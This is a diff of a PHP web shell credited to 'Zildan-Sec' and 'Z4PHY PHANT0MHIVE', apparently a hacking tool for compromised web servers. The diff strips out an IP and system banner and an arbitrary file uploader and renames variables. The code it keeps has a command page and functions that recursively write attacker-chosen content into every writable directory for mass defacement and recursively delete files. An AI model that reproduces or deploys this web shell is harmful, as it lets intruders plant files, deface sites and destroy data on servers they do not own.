@@ -128,99 +128,56 @@ text-align: left;
 <table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
 <tr><td>';
 echo "<tr><td><font color='white'>
-+ IP Kamu Syg    <td>: <font color='LightBlue'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
-+ IP Server  <td>: <font color='LightBlue'>".gethostbyname($_SERVER['HTTP_HOST'])."<tr><td><font color='white'>
-+ system     <td>: <font color='LightBlue'>".php_uname()."<tr><td><font color='white'>
-+ Coded By   <td>: <font color='LightBlue'>Zildan-Sec<tr><td><font color='white'>
-+ Website<td>: <font color='LightBlue'>Zildan-Sec.my.id<tr><td><font color='white'>
-+ Youtube <td>: <font color='LightBlue'>$ .: Z4PHY PHANT0MHIVE :. $</font></tr></td><br>
++ Coded By   <td>: <font color='LightBlue'>$ .: Z4PHY PHANT0MHIVE :. $<tr><td><font color='white'>
 </table>";
-echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
-<center><tr align="center"><td align="center">path : ';
-if(isset($_GET['path'])){
-$path = $_GET['path'];
-}else{
-$path = getcwd();
-}
-$path = str_replace('\\','/',$path);
-$paths = explode('/',$path);
-
-foreach($paths as $id=>$pat){
-if($pat == '' && $id == 0){
-$a = true;
-echo '<a href="?path=/">/</a>';
-continue;
-}
-if($pat == '') continue;
-echo '<a href="?path=';
-for($i=0;$i<=$id;$i++){
-echo "$paths[$i]";
-if($i != $id) echo "/";
-}
-echo '">'.$pat.'</a>/';
-}
-
-if(isset($_FILES['file'])){
-if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-echo '<font color="yellow">UPLOADED SUCCES !!!!!</script><br/>';
-}else{
-echo '<script> alert("UPLOADED FAILED COK !!!!!")</script></font><br/>';
-}
-}
-echo '</tr><tr align="center"><td align="center"><form enctype="multipart/form-data" method="POST">
-<font color="white"><br><b></font><input type="file"name="file" style="widht:900px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid red;"/>
-<input type="submit" value="Upload" style="margin-top:4px;width:150px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid red;border-radius:5px"/><br><br>
-</form></center>';
-echo "</td></tr>";
-echo "</table>";
 echo "<center>";
 echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
 echo "<a class='destroy_table' href='?'>Home</a>";
 echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=mass'>Gasspoll!</a>";
-echo "<a class='destroy_table' href='?dir=$dir&to=masse'>Mass_delete</a><br>";
+echo "<a class='destroy_table' href='?dir=$dir&to=Tyebas'>Tyebas</a><br>";
 echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
 echo "<a class='destroy_table' href='?dir=$dir&do=about'>About</a>";
 echo "</center>";
 
 if($_GET['to'] == 'mass') {
-	function sabun_massal($dir,$namafile,$isi_script) {
+	function sabun_massal($dir,$nganunya,$dalemnya) {
 		if(is_writable($dir)) {
-			$dira = scandir($dir);
-			foreach($dira as $dirb) {
-				$dirc = "$dir/$dirb";
-				$lokasi = $dirc.'/'.$namafile;
-				if($dirb === '.') {
-					file_put_contents($lokasi, $isi_script);
-				} elseif($dirb === '..') {
-					file_put_contents($lokasi, $isi_script);
+			$bentuka = scandir($dir);
+			foreach($bentuka as $bentukb) {
+				$bentukc = "$dir/$bentukb";
+				$sharelok = $bentukc.'/'.$nganunya;
+				if($bentukb === '.') {
+					file_put_contents($sharelok, $dalemnya);
+				} elseif($bentukb === '..') {
+					file_put_contents($sharelok, $dalemnya);
 				} else {
-					if(is_dir($dirc)) {
-						if(is_writable($dirc)) {
-							echo "[<font color=lime>DONE</font>] $lokasi<br>";
-							file_put_contents($lokasi, $isi_script);
-							$idx = sabun_massal($dirc,$namafile,$isi_script);
+					if(is_dir($bentukc)) {
+						if(is_writable($bentukc)) {
+							echo "[<font color=lime>DONE</font>] $sharelok<br>";
+							file_put_contents($sharelok, $dalemnya);
+							$idx = sabun_massal($bentukc,$nganunya,$dalemnya);
 						}
 					}
 				}
 			}
 		}
 	}
-	function sabun_biasa($dir,$namafile,$isi_script) {
+	function sabun_biasa($dir,$nganunya,$dalemnya) {
 		if(is_writable($dir)) {
-			$dira = scandir($dir);
-			foreach($dira as $dirb) {
-				$dirc = "$dir/$dirb";
-				$lokasi = $dirc.'/'.$namafile;
-				if($dirb === '.') {
-					file_put_contents($lokasi, $isi_script);
-				} elseif($dirb === '..') {
-					file_put_contents($lokasi, $isi_script);
+			$bentuka = scandir($dir);
+			foreach($bentuka as $bentukb) {
+				$bentukc = "$dir/$bentukb";
+				$sharelok = $bentukc.'/'.$nganunya;
+				if($bentukb === '.') {
+					file_put_contents($sharelok, $dalemnya);
+				} elseif($bentukb === '..') {
+					file_put_contents($sharelok, $dalemnya);
 				} else {
-					if(is_dir($dirc)) {
-						if(is_writable($dirc)) {
-							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
-							file_put_contents($lokasi, $isi_script);
+					if(is_dir($bentukc)) {
+						if(is_writable($bentukc)) {
+							echo "[<font color=lime>DONE</font>] $bentukb/$nganunya<br>";
+							file_put_contents($sharelok, $dalemnya);
 						}
 					}
 				}
@@ -251,28 +208,28 @@ if($_GET['to'] == 'mass') {
 	<input type='submit' name='start' value='ENTOT COK!' style='width: 450px;'>
 	</form></center>";
 	} 
-	} elseif($_GET['to'] == 'masse') {
-   function hapus_massal($dir,$namafile) {
+	} elseif($_GET['to'] == 'Tyebas') {
+   function tybeasall($dir,$nganunya) {
 if(is_writable($dir)) {
-   $dira = scandir($dir);
-   foreach($dira as $dirb) {
-       $dirc = "$dir/$dirb";
-       $lokasi = $dirc.'/'.$namafile;
-       if($dirb === '.') {
-           if(file_exists("$dir/$namafile")) {
-               unlink("$dir/$namafile");
+   $bentuka = scandir($dir);
+   foreach($bentuka as $bentukb) {
+       $bentukc = "$dir/$bentukb";
+       $sharelok = $bentukc.'/'.$nganunya;
+       if($bentukb === '.') {
+           if(file_exists("$dir/$nganunya")) {
+               unlink("$dir/$nganunya");
            }
-       } elseif($dirb === '..') {
-           if(file_exists("".dirname($dir)."/$namafile")) {
-               unlink("".dirname($dir)."/$namafile");
+       } elseif($bentukb === '..') {
+           if(file_exists("".dirname($dir)."/$nganunya")) {
+               unlink("".dirname($dir)."/$nganunya");
            }
        } else {
-           if(is_dir($dirc)) {
-               if(is_writable($dirc)) {
-                   if(file_exists($lokasi)) {
-                       echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
-                       unlink($lokasi);
-                       $idx = hapus_massal($dirc,$namafile);
+           if(is_dir($bentukc)) {
+               if(is_writable($bentukc)) {
+                   if(file_exists($sharelok)) {
+                       echo "[<font color=#52CF38>Terhapus</font>] $sharelok<br>";
+                       unlink($sharelok);
+                       $idx = tybeasall($bentukc,$nganunya);
                    }
                }
            }
@@ -282,7 +239,7 @@ if(is_writable($dir)) {
    }
    if($_POST['start']) {
 echo "<div style='margin: 5px auto; padding: 5px'>";
-hapus_massal($_POST['d_dir'], $_POST['d_file']);
+tybeasall($_POST['d_dir'], $_POST['d_file']);
 echo "</div>";
    } else {
    echo "<center>";
